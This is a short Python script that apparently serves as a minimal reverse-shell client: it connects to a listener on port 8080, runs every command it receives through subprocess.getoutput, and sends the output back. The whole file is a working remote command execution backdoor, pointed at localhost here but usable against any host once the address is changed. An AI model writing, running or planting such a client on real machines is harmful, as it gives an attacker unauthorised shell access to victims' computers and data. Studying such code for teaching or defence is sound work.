import socket
import subprocess

slave = socket.socket()

host = "127.0.0.1"

port = 8080

slave.bind(('127.0.0.1', 65531))
slave.connect((host, port))


while True:
    command = slave.recv(1024).decode()
    print(command)

    if command == "exit":
        break

    output  = "<CONSOLE_BEGIN>"

    output += subprocess.getoutput(command)

    try:
        slave.send(output.encode())
    except:
        pass

slave.close()
